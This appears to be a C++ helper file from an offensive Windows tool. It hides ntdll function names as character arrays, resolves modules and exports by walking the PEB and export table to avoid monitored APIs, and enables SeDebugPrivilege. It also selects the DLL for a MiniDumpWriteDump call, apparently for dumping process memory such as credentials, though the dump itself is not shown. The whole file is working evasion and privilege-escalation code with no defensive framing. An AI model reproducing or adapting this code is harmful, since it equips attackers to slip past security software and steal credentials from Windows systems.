#include "helper.h"
#include <iostream>

using namespace std;

char ntdllName[] = { 'n','t','d','l','l','.','d','l','l','\0' };
char openTokenStr[] = { 'N','t','O','p','e','n','P','r','o','c','e','s','s','T','o','k','e','n','\0' };
char queryTokenStr[] = { 'N','t','Q','u','e','r','y','I','n','f','o','r','m','a','t','i','o','n','T','o','k','e','n','\0' };
char ntcloseStr[] = { 'N','t','C','l','o','s','e','\0' };
char adjustTokenStr[] = { 'N','t','A','d','j','u','s','t','P','r','i','v','i','l','e','g','e','s','T','o','k','e','n','\0' };
char ntwriteStr[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0' };
char ntprotectStr[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y','\0' };
char RTLinit[] = { 'R','t','l','I','n','i','t','U','n','i','c','o','d','e','S','t','r','i','n','g','\0' };
char creatFile[] = { 'N','t','C','r','e','a','t','e','F','i','l','e','\0' };
char Op3npr0[] = { 'N','t','O','p','e','n','P','r','o','c','e','s','s','\0' };


HMODULE ntdll = getNTDLL();

PNtClose NtClose = (PNtClose)hlpGetProcAddress(ntdll, ntcloseStr);
PNtOpenProcessToken NtOpenProcessToken = (PNtOpenProcessToken)hlpGetProcAddress(ntdll, openTokenStr);
PNtQueryInformationToken NtQueryInformationToken = (PNtQueryInformationToken)hlpGetProcAddress(ntdll, queryTokenStr);
PNtAdjustPrivilegesToken NtAdjustPrivilegesToken = (PNtAdjustPrivilegesToken)hlpGetProcAddress(ntdll, adjustTokenStr);
myNtWriteVirtualMemory NtWriteVirtualMemory = (myNtWriteVirtualMemory)hlpGetProcAddress(ntdll, ntwriteStr);
myNtProtectVirtualMemory NtProtectVirtualMemory = (myNtProtectVirtualMemory)hlpGetProcAddress(ntdll, ntprotectStr);
_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)hlpGetProcAddress(ntdll, RTLinit);
myNtCreateFile ntCreateFile = (myNtCreateFile)hlpGetProcAddress(ntdll, creatFile);
myNtOpenProcess pOpenProcess = (myNtOpenProcess)hlpGetProcAddress(ntdll, Op3npr0);


HMODULE WINAPI hlpGetModuleHandle(LPCWSTR sModuleName) {
	// get the offset of Process Environment Block
#ifdef _M_IX86 
	PEB* ProcEnvBlk = (PEB*)__readfsdword(0x30);
#else
	PEB* ProcEnvBlk = (PEB*)__readgsqword(0x60);
#endif
	// return base address of a calling module
	if (sModuleName == NULL)
		return (HMODULE)(ProcEnvBlk->ImageBaseAddress);
	PEB_LDR_DATA* Ldr = ProcEnvBlk->Ldr;
	LIST_ENTRY* ModuleList = NULL;
	ModuleList = &Ldr->InMemoryOrderModuleList;
	LIST_ENTRY* pStartListEntry = ModuleList->Flink;
	for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink) {
		// get current Data Table Entry
		LDR_DATA_TABLE_ENTRY* pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		// check if module is found and return its base address
		if (_wcsicmp(pEntry->BaseDllName.Buffer, sModuleName) == 0)
			return (HMODULE)pEntry->DllBase;
	}
	// otherwise:
	return NULL;
}

FARPROC WINAPI hlpGetProcAddress(HMODULE hMod, char* sProcName) {
	char* pBaseAddr = (char*)hMod;
	// get pointers to main headers/structures
	IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pBaseAddr;
	IMAGE_NT_HEADERS* pNTHdr = (IMAGE_NT_HEADERS*)(pBaseAddr + pDosHdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER* pOptionalHdr = &pNTHdr->OptionalHeader;
	IMAGE_DATA_DIRECTORY* pExportDataDir = (IMAGE_DATA_DIRECTORY*)(&pOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
	IMAGE_EXPORT_DIRECTORY* pExportDirAddr = (IMAGE_EXPORT_DIRECTORY*)(pBaseAddr + pExportDataDir->VirtualAddress);
	// resolve addresses to Export Address Table, table of function names and "table of ordinals"
	DWORD* pEAT = (DWORD*)(pBaseAddr + pExportDirAddr->AddressOfFunctions);
	DWORD* pFuncNameTbl = (DWORD*)(pBaseAddr + pExportDirAddr->AddressOfNames);
	WORD* pHintsTbl = (WORD*)(pBaseAddr + pExportDirAddr->AddressOfNameOrdinals);
	// function address we're looking for
	void* pProcAddr = NULL;
	// resolve function by name	
		// parse through table of function names
	for (DWORD i = 0; i < pExportDirAddr->NumberOfNames; i++) {
		char* sTmpFuncName = (char*)pBaseAddr + (DWORD_PTR)pFuncNameTbl[i];

		if (strcmp(sProcName, sTmpFuncName) == 0) {
			// found, get the function virtual address = RVA + BaseAddr
			pProcAddr = (FARPROC)(pBaseAddr + (DWORD_PTR)pEAT[pHintsTbl[i]]);
			break;
		}
	}
	return (FARPROC)pProcAddr;
}





LPCWSTR charToLPCWSTR(const char* charString) {
	// Calculate the size needed for the wide string buffer
	int size_needed = MultiByteToWideChar(CP_ACP, 0, charString, -1, NULL, 0);

	// Allocate memory for the wide string buffer
	static wchar_t wideString[256];
	if (size_needed > sizeof(wideString) / sizeof(wideString[0])) {
		// Handle buffer size exceeded case
		return NULL;
	}

	// Perform the conversion
	MultiByteToWideChar(CP_ACP, 0, charString, -1, wideString, size_needed);

	return wideString;
}
LPWSTR charToLPWSTR(const char* charString) {
	// Calculate the size needed for the wide string buffer
	int size_needed = MultiByteToWideChar(CP_ACP, 0, charString, -1, NULL, 0);

	// Allocate memory for the wide string buffer
	static wchar_t wideString[256];  // Adjust buffer size as needed
	if (size_needed > sizeof(wideString) / sizeof(wideString[0])) {
		// Handle buffer size exceeded case
		return NULL;
	}

	// Perform the conversion
	MultiByteToWideChar(CP_ACP, 0, charString, -1, wideString, size_needed);

	return wideString;
}

HMODULE getNTDLL() {
	HMODULE ntdll = hlpGetModuleHandle(charToLPCWSTR(ntdllName));
	return ntdll;
}

BOOL SetDebugPrivilege()
{
    // 64-bit only
    if (sizeof(LPVOID) != 8)
    {
        wcout << "[!] 64-bit architecture only" << endl;
        return FALSE;
    }

    // Overall status of requirement checks
    BOOL status = FALSE;

    // Initialize handle to process token
    HANDLE token = NULL;

    // Open our token
    if (NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &token) == 0)
    {
        // Token elevation struct
        TOKEN_ELEVATION tokenElevation = { 0 };

        // Size of token elevation struct
        DWORD tokenElevationSize = sizeof(TOKEN_ELEVATION);

        // Get token elevation status
        if (NtQueryInformationToken(token, TokenElevation, &tokenElevation, sizeof(tokenElevation), &tokenElevationSize) == 0)
        {
            // Check if token is elevated
            if (tokenElevation.TokenIsElevated)
            {
                // Token is elevated, check/enable SeDebugPrivilege

                // Size of token privilege struct
                DWORD tokenPrivsSize = 0;

                // Get size of current privilege array
                if (NtQueryInformationToken(token, TokenPrivileges, NULL, NULL, &tokenPrivsSize) == 0xC0000023)
                {
                    // Allocate memory to store current token privileges
                    PTOKEN_PRIVILEGES tokenPrivs = (PTOKEN_PRIVILEGES)new BYTE[tokenPrivsSize];

                    // Get current token privileges
                    if (NtQueryInformationToken(token, TokenPrivileges, tokenPrivs, tokenPrivsSize, &tokenPrivsSize) == 0)
                    {
                        // Track whether or not token has SeDebugPrivilege
                        BOOL hasDebug = FALSE;

                        // Loop through privileges assigned to token to find SeDebugPrivilege
                        for (DWORD i = 0; i < tokenPrivs->PrivilegeCount; i++)
                        {
                            // SeDebugPrivilege LUID = 0x14
                            if (tokenPrivs->Privileges[i].Luid.LowPart == 0x14)
                            {
                                hasDebug = TRUE;

                                // Located SeDebugPrivilege, enable it if necessary
                                if (!(tokenPrivs->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED))
                                {
                                    tokenPrivs->Privileges[i].Attributes |= SE_PRIVILEGE_ENABLED;

                                    // Apply updated privilege struct to token
                                    if (NtAdjustPrivilegesToken(token, FALSE, tokenPrivs, tokenPrivsSize, NULL, NULL) == 0)
                                    {
                                        wcout << "[+] Enabled SeDebugPrivilege" << endl;
                                        status = TRUE;
                                        break;
                                    }
                                    else wcout << "[!] Failed to enable SeDebugPrivilege" << endl;
                                }
                                else
                                {
                                    wcout << "[+] SeDebugPrivilege already enabled" << endl;
                                    status = TRUE;
                                    break;
                                }
                            }
                        }

                        if (!hasDebug)
                            wcout << "[!] Token does not have SeDebugPrivilege" << endl;
                    }
                    else wcout << "[!] Failed to query token privileges" << endl;

                    // Free token privileges buffer
                    delete tokenPrivs;
                }
                else wcout << "[!] Failed to determine size of token privileges array" << endl;
            }
            else wcout << "[!] Administrative privileges required" << endl;
        }
        else wcout << "[!] Failed to query token elevation status" << endl;

        // Close token handle
        NtClose(token);
    }
    else wcout << "[!] Failed to open process token" << endl;

    return status;
}

// Function:    GetWinVersion
// Description: Get Windows major version from KUSER_SHARED_DATA
// Called from: GetMiniDumpWriteDump
// Returns:     Major version, e.g. 5, 6, 10
// Source:      https://gist.github.com/slaeryan/2c73c4c4e33dfd7d8ce38312aacc9324
#define KUSER_SHARED_DATA 0x7ffe0000
#define MAJOR_VERSION_OFFSET 0x026C
DWORD GetWinVersion()
{
    return *(PULONG)(KUSER_SHARED_DATA + MAJOR_VERSION_OFFSET);
}

std::string GetDebugDLLPath()
{
    // Get system directory, e.g. c:\windows\system32
    CHAR systemDir[MAX_PATH];
    UINT systemDirSize = GetSystemDirectoryA(systemDir, MAX_PATH);

    // Initialize string with system directory
    string path(systemDir, systemDirSize);

    path += "\\"; // Append slash

    // Append appropriate DLL name
    if (GetWinVersion() == 10)
        // Use dbgcore.dll with Windows 10
        path += "dbgcore.dll";
    else
        // Use dbghelp.dll for everything else
        path += "dbghelp.dll";

    return path;
}